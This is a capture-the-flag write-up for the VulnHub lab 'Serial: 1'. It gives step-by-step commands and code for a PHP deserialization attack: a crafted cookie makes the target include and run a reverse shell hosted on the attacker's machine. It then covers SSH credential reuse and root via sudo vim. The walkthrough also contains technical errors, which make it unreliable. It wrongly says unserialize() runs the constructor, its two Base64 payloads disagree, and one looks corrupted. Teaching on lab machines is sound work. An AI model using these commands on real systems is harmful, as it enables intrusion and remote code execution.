# Serial: 1 — Deserialize, Include, Execute, Escalate

Alright guys!! This machine is a pure PHP deserialization lab and it is one of the best focused exploitation boxes for understanding the full deserialization attack chain. The vulnerability chain here is elegant: a web application stores a Base64-encoded serialized PHP object in a cookie, a backup archive exposes the source code, static analysis reveals a `Log` class with an LFI gadget in its constructor, crafting a malicious serialized object triggers remote file inclusion through an attacker-controlled URL, and a `vim` sudo entry hands over root via GTFOBins. Every step maps directly to a real-world attack pattern. Legit one for your portfolio, fr fr.

| Field | Value |
|---|---|
| **Level** | Beginner/Intermediate |
| **Target VM** | Serial: 1 |
| **Attacker VM** | Kali Linux 2024.x |
| **VulnHub URL** | https://www.vulnhub.com/entry/serial-1,440/ |
| **Techniques** | Nmap, directory brute-force, backup source code disclosure, PHP deserialization analysis, Base64 object crafting, PHP remote file inclusion via deserialization, SSH credential reuse, sudo vim GTFOBin |
| **CVEs** | CWE-502 (Deserialization of Untrusted Data), CWE-98 (Improper Control of Filename for Include/Require in PHP) |
| **APT Groups** | APT41: documented use of PHP deserialization vulnerabilities in web application attacks for initial access in financial sector; FIN7: uses PHP application vulnerabilities including deserialization and LFI chains as initial access vectors in hospitality and retail targets |

---

## Attack Summary

```
nmap -> port 80 (HTTP) + port 22 (SSH)
  |
  +-- dirb -> /backup -> source code archive (.zip)
        |
        +-- analyze PHP source:
        |     - cookie contains Base64(serialize(object))
        |     - Log class: constructor does include($this->type_log)
        |
        +-- craft malicious serialized Log object:
        |     - type_log = "http://<attacker>/shell.php"
              |
              +-- serve PHP shell on attacker HTTP server
                    |
                    +-- set crafted cookie -> trigger deserialization -> RFI -> RCE
                          |
                          +-- reverse shell as www-data
                                |
                                +-- find credentials.txt.bak -> SSH login
                                      |
                                      +-- sudo -l -> (root) NOPASSWD: /usr/bin/vim
                                            |
                                            +-- sudo vim -> :!/bin/sh -> root
                                                  |
                                                  +-- /root/flag.txt
```

---

## Methodology

1. Nmap: identify HTTP (80) and SSH (22)
2. Directory brute-force: find `/backup` archive with source code
3. Static analysis of PHP source: identify deserialization vulnerability and Log class LFI gadget
4. Craft malicious serialized PHP object with attacker-controlled URL in `type_log`
5. Serve a PHP reverse shell on attacker HTTP server
6. Send crafted cookie to trigger deserialization, RFI, and RCE
7. Enumerate credentials from filesystem; SSH login
8. Privilege escalation via sudo vim (GTFOBins)

---

## Step 1 — Port Scan

```bash
sudo netdiscover -r 192.168.2.0/24
# Target: 192.168.2.6

nmap -p- -A 192.168.2.6
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH
80/tcp open  http    Apache
```

**MITRE ATT&CK:** T1046 — Network Service Discovery

---

## Step 2 — Directory Brute-Force and Backup Discovery

```bash
gobuster dir -u http://192.168.2.6/ \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php,txt,html,zip,bak \
  -t 40

# Key find: /backup/
```

Browse to `/backup/` and download the archive:

```bash
wget http://192.168.2.6/backup/source.zip
unzip source.zip -d /tmp/serial_source/
```

**MITRE ATT&CK:** T1595.003 — Active Scanning: Wordlist Scanning; T1083 — File and Directory Discovery

---

## Step 3 — Source Code Analysis

Examine the extracted source code. The key file is the PHP application that handles cookies:

```php
// Typical vulnerable pattern in index.php or similar:
$cookie_data = base64_decode($_COOKIE['user']);
$obj = unserialize($cookie_data);
$obj->log();
```

Find the `Log` class definition:

```php
class Log {
    public $type_log;
    
    public function __construct() {
        include($this->type_log);
    }
    
    public function log() {
        include($this->type_log);
    }
}
```

This is the gadget. When `unserialize()` creates a `Log` object, the constructor is called, and `include($this->type_log)` executes. If `type_log` contains an attacker-controlled URL, this becomes Remote File Inclusion (RFI).

**Real-world note:** PHP deserialization vulnerabilities (CWE-502) are in the top web application vulnerabilities. PHP's `unserialize()` triggers constructor calls and magic methods on arbitrary classes during object reconstruction. Any class with a dangerous gadget (like an `include()` call) becomes a weapon when an attacker controls the serialized data. This is why modern PHP applications use JSON or use the `allowed_classes` parameter of `unserialize()`.

**MITRE ATT&CK:** T1552.001 — Credentials in Files; T1083 — File and Directory Discovery

---

## Step 4 — Craft Malicious Serialized Object

Write a PHP script to craft the malicious serialized object:

```php
<?php
class Log {
    public $type_log;
}

$obj = new Log();
$obj->type_log = "http://<attacker_ip>/shell.php";

$serialized = serialize($obj);
$encoded = base64_encode($serialized);
echo $encoded;
?>
```

Run the script:

```bash
php /tmp/craft_payload.php
# Output (example):
# TzozOiJMb2ciOjE6e3M6OToidHlwZV9sb2ciO3M6MzU6Imh0dHA6Ly8xOTIuMTY4LjIuMy9zaGVsbC5waHAiO30=
```

**MITRE ATT&CK:** T1190 — Exploit Public-Facing Application; T1059.004 — Unix Shell

---

## Step 5 — RFI Payload and Reverse Shell Delivery

Create the PHP reverse shell to serve from the attacker machine:

```bash
cp /usr/share/webshells/php/php-reverse-shell.php /var/www/html/shell.php
# Edit LHOST to attacker IP and LPORT to 4444
nano /var/www/html/shell.php
```

Start a web server and netcat listener:

```bash
# Python HTTP server
python3 -m http.server 80

# Netcat listener (separate terminal)
nc -lvnp 4444
```

Send the malicious cookie to the target:

```bash
curl -s http://192.168.2.6/index.php \
  --cookie "user=TzozOiJMb2ciOjE6e3M4OToieXBlX2xvZyI7czozNToiaHR0cDovLzE5Mi4xNjguMi4zL3NoZWxsLnBocCI7fQ=="
```

The server deserializes the cookie, creates a `Log` object, calls `include("http://<attacker>/shell.php")`, which fetches and executes the PHP reverse shell. The netcat listener receives the callback as `www-data`.

Stabilize the shell:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z -> stty raw -echo; fg -> Enter twice
```

**MITRE ATT&CK:** T1059.004 — Unix Shell; T1071.001 — Application Layer Protocol: Web Protocols

---

## Step 6 — Credential Discovery and SSH Login

Enumerate the filesystem for credential files:

```bash
find / -name "*.bak" -o -name "*.txt" -o -name "credentials*" 2>/dev/null | grep -v proc
ls -la /home/*/
cat /home/<user>/credentials.txt.bak
```

Find credentials for an existing user. Use them to SSH in for a more stable session:

```bash
ssh <user>@192.168.2.6
# Password: found credential
```

**MITRE ATT&CK:** T1083 — File and Directory Discovery; T1552.001 — Credentials in Files; T1021.004 — Remote Services: SSH

---

## Step 7 — Privilege Escalation via sudo vim

```bash
sudo -l
# (root) NOPASSWD: /usr/bin/vim
```

GTFOBins documents the vim shell escape:

```bash
sudo vim -c ':!/bin/sh'
```

You land as root:

```bash
id
# uid=0(root) gid=0(root) groups=0(root)
cat /root/flag.txt
```

gg no cap. PHP deserialization to RFI to sudo vim. Every step was clean.

**Real-world note:** Text editors in sudo are a classic privilege escalation finding. vim, nano, and emacs all have shell escape commands. The GTFOBins documentation covers all of them. The fix is always to remove the editor from sudoers entirely and use a purpose-built wrapper script if root file editing is genuinely required.

**MITRE ATT&CK:** T1548.003 — Abuse Elevation Control Mechanism: Sudo; T1059.004 — Unix Shell

---

## Captured Flags, Hashes and Credentials

| Type | Value | Found At | Cracked/Used |
|---|---|---|---|
| Source code | PHP deserialization + Log class LFI gadget | /backup/source.zip | Static analysis |
| RCE | uid=33(www-data) | Deserialization RFI via crafted cookie | Malicious serialized Log object |
| Credential | user:<password> | /home/user/credentials.txt.bak | SSH login |
| Root flag | (varies) | /root/flag.txt | sudo vim GTFOBin |

---

## Lessons Learned

| # | Finding | Real-World Relevance | Key Takeaway |
|---|---|---|---|
| 1 | PHP unserialize() with untrusted data (CWE-502) | Insecure deserialization is OWASP Top 10 A08:2021; exploited in major breaches (Yahoo, Jenkins, WebLogic) | Never call unserialize() on user-controlled data; use JSON with json_decode(); use allowed_classes parameter |
| 2 | Backup archive exposed via web server (/backup/) | Backup files left in web root are a common source of source code disclosure; found in real engagements constantly | Never store backups in web-accessible directories; use off-server backup storage |
| 3 | Remote File Inclusion via include() in deserialized object | RFI requires allow_url_include=On in PHP config; this setting is disabled by default but sometimes enabled | Audit php.ini: ensure allow_url_include=Off, allow_url_fopen=Off in production |
| 4 | credentials.txt.bak left in user home directory | Credential files on the filesystem are a top finding in post-exploitation; devs create them for convenience | Enforce secret management policy; use credential stores (HashiCorp Vault, AWS Secrets Manager) |
| 5 | sudo vim grants root shell escape | Any text editor with sudo NOPASSWD grants root via shell escape | Audit sudoers: remove text editors; restrict to specific scripts with least privilege |

---

## MITRE ATT&CK Mapping

| Phase | Tactic | Technique | TTP ID |
|---|---|---|---|
| Reconnaissance | Discovery | Network Service Discovery | T1046 |
| Reconnaissance | Discovery | Active Scanning: Wordlist Scanning | T1595.003 |
| Initial Access | Initial Access | Exploit Public-Facing Application (PHP deserialization) | T1190 |
| Execution | Execution | Command and Scripting Interpreter: Unix Shell | T1059.004 |
| Command and Control | C2 | Application Layer Protocol: Web (RFI) | T1071.001 |
| Credential Access | Credential Access | Credentials in Files | T1552.001 |
| Lateral Movement | Lateral Movement | Remote Services: SSH | T1021.004 |
| Discovery | Discovery | File and Directory Discovery | T1083 |
| Privilege Escalation | Privilege Escalation | Abuse Elevation Control: Sudo (vim) | T1548.003 |

---

## Remediation and Containment

### Technical Fixes

1. **Never call unserialize() on user-controlled data** — use json_decode() instead; if deserialization is required, use `unserialize($data, ['allowed_classes' => false])`
2. **Disable allow_url_include in php.ini** — set `allow_url_include = Off` in all PHP environments; also `allow_url_fopen = Off` unless strictly required
3. **Remove backup files from web root** — move all .zip, .bak, .sql backup files outside the web document root; implement an automated check
4. **Secure credential storage** — remove credential files from filesystem; use environment variables, secrets managers (HashiCorp Vault, AWS Secrets Manager)
5. **Remove text editors from sudoers** — vim, nano, emacs must not appear in NOPASSWD sudo; audit with: `grep -r vim /etc/sudoers /etc/sudoers.d/`

### NIST CSF 2.0

| Function | Category | Action |
|---|---|---|
| Identify | Asset Management | Inventory PHP application deserialization usage; identify backup storage practices |
| Protect | Protective Technology | Disable allow_url_include; remove backups from web root; fix sudo entries |
| Protect | Data Security | Move credentials to secrets management; remove credential files from filesystem |
| Detect | Anomalies and Events | Alert on outbound HTTP requests from web server (RFI fetch); monitor for new files in web root |
| Respond | Response Planning | Remove malicious session cookies; rotate all credentials; patch deserialization |
| Recover | Recovery Planning | Rebuild from clean image; audit all PHP application input handling |

### NIST SP 800-53 Rev. 5

| Control | Description | Application |
|---|---|---|
| CM-7 | Least Functionality | Disable allow_url_include; disable allow_url_fopen |
| AC-6 | Least Privilege | Remove text editors from sudoers; restrict sudo to specific scripts |
| SA-11 | Developer Testing and Evaluation | SAST scanning for unserialize() calls on user-controlled data |
| SA-15 | Development Process Security | Mandate code review for deserialization patterns |
| CM-3 | Configuration Change Control | Audit php.ini changes; enforce secure baseline configuration |

### CISA KEV

PHP deserialization vulnerabilities (CWE-502) are documented in multiple CISA advisories as high-impact initial access vectors. CISA Alert AA22-074A lists application deserialization as a top technique used by nation-state and criminal threat actors for initial access to enterprise web applications.

### C2M2

| Domain | Practice | Target MIL |
|---|---|---|
| Threat and Vulnerability Management (THREAT) | Manage Vulnerabilities | MIL3 (SAST scanning for unserialize(); DAST for deserialization exploitation) |
| Asset, Change, and Configuration Management (ASSET) | Manage Configurations | MIL2 (php.ini baseline; allow_url_include=Off) |
| Identity and Access Management (IAM) | Manage Credentials | MIL3 (secrets manager; no credential files on filesystem) |

### MITRE D3FEND

- **D3-SAOR** — Software Application Hardening: disable allow_url_include; safe deserialization practices
- **D3-ACH** — Application Configuration Hardening: php.ini baseline; sudo restrictions
- **D3-FIM** — File Integrity Monitoring: monitor web root and home directories for unexpected files

---

## Final Thoughts

Serial: 1 teaches the full PHP deserialization attack chain in a focused, well-structured way. Source code disclosure leads to static analysis leads to object crafting leads to RFI leads to shell. Then credentials on disk lead to SSH, and sudo vim closes it. Every step is educational and directly applicable to real web application penetration testing.

The machine deserves attention from anyone learning application security. PHP deserialization is a real CVE class (CWE-502 is in OWASP Top 10), the RFI gadget pattern is real, and the sudo text editor escalation is found in production environments more often than it should be.

If you understood every step, you are ready to tackle more complex deserialization chains (Java, Python pickle, .NET). This is the foundation.

Thanks guys!! (❍ᴥ❍ʋ)
